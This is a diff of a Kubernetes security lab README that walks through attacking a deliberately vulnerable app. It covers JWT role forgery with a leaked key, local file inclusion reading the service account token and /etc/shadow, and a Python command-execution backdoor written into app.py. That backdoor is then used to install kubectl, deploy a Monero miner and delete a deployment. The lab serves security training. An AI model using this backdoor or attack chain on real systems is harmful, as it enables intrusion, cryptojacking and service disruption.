@@ -1,39 +1,61 @@
 # Exploit Application Vulnerabilities
 
-user-password form + registration.
-You sign-up -> follow redirection -> see JWT: role+secret -> replace role with admin -> go to cats again and see another page (with LFI) -> read ../../../../../etc/sa-token and print it base64-encoded -> use it to authenticate your kubectl/curl.
 
-Cats service:
-    reads file <img data="base-64-encoded-content"/>
-    unauthenticated mode: 503
-    user mode: button "Next image" (selecting a random image from a local directory)
-    admin mode: text input "filename" (allows "../")
-
-Additional: use Postgres, store secret in K8s secrets, read it via kubectl, access DB directly
+Application vulnerabilities can bring wide range of different entrypoints. In addition to Kubernetes-specific vulnerabilities and misconfigurations, this can lead to various beautiful attacks.
 
 
----
 
-```
-NS=vulnapp
+## Attack
+- get the `SECRET_KEY`:
+  - either find the [leaked value](http://mock-emailx.seck8s.slurm.io/clusters/local/namespaces/vulnapp/deployments/images-api) in the exposed unprotected Dashboard
+  - or check the Git-blame to find the hard-coded secret in sources *vulnerability: [hard-coded credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*
+- register a test user in `auth-api`, get the JWT (with `user_role='user'`)
+- proceed to `images-api` with the JWT token, see the image (partially logged in)
+- decode the JWT token using the leaked secret key and modify `user_role='admin'` (*vulnerability: [Broken User Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)*)
+- proceed to `images-api` with the new token, see the admin page
+- read some files: `/var/run/secrets/kubernetes.io/serviceaccount/token`, `./app.py`, `/etc/shadow`, `/proc/1/environ`, etc.: (*vulnerability: [LFI, Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)*)
+- write the `./app.py` with backdoor activated via GET parameter `cmd` ([Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload))
+    ```python
+    ...
+    @app.route("/", methods=["GET"])
+    def home():
+        cmd = request.args.get('cmd')
+        if cmd:
+            import subprocess
+            p = subprocess.run(["bash", "-c", cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+            return p.stdout.decode()
+        ...
+    ```
+- since the server is in Debug mode, it auto-reloads without restarting the pod
+- use the backdoor to install `kubectl`:
+  - ?cmd=apt-get+update
+  - ?cmd=apt-get+-y+install+curl
+  - Next, from https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/:
+  - ?cmd=curl%20-LO%20%22https://dl.k8s.io/release/$(curl%20-L%20-s%20https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl%22
+  - ?cmd=install%20-o%20root%20-g%20root%20-m%200755%20kubectl%20/usr/local/bin/kubectl
+  - ?cmd=kubectl+get+all
+- now you can use kubectl configured to the workload's service account:
+    ```sh
+    # Deploy a miner
+    ?cmd=kubectl+apply+-f+images/monero-deployment.yaml
+    ?cmd=kubectl+get+all
+    ```
+- or shut down the cluster's payload (Deployment only, permitted by RBAC)
+    ```sh
+    ?cmd=kubectl+delete+deployment+auth-api
+    ```
 
-k create ns $NS
-k -n $NS create secret generic auth-db-secret \
-    --from-literal root_password=P@ssw0rd \
-    --from-literal database=userdata \
-    --from-literal username=user \
-    --from-literal password=password
-k -n $NS create secret generic auth-api-secret \
-    --from-literal secret=secret123
-k -n $NS apply -f ../../apps/03-appsec/images-api/deploy
-k -n $NS apply -f ../../apps/03-appsec/auth-api/deploy
-
-k -n $NS get all,ingress
-k -n $NS get po -w
+> Note: inside the pod, kubectl is authenticated to the pod's SA. However, you could save SA's `token` and `ca.crt` to your local machine and, knowing the Kube API public URI, you can acess it remotely:
+> `kubectl --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) <command>`
 
 
-k delete ns $NS
+## Steps to reproduce
 
-```
-
----
+1. Deploy [vulnerable-app/auth-api](vulnerable-app/auth-api) and [vulnerable-app/images-api](vulnerable-app/images-api)
+2. Go to [auth service](http://auth.vulnapp.seck8s.slurm.io/)
+3. Sign-up any user and login
+4. Get redirection to the [image service](https://images.vulnapp.seck8s.slurm.io/) with the greatest cat in the world :)
+5. Decode JWT token and try to get more privileges
+6. Write any interesting file (take a look at the image b64 data you'll receive)
+7. Upload any interesting file (note: the container runs as root so you're relatively free)
+8. Get working `kubectl` for the cluster
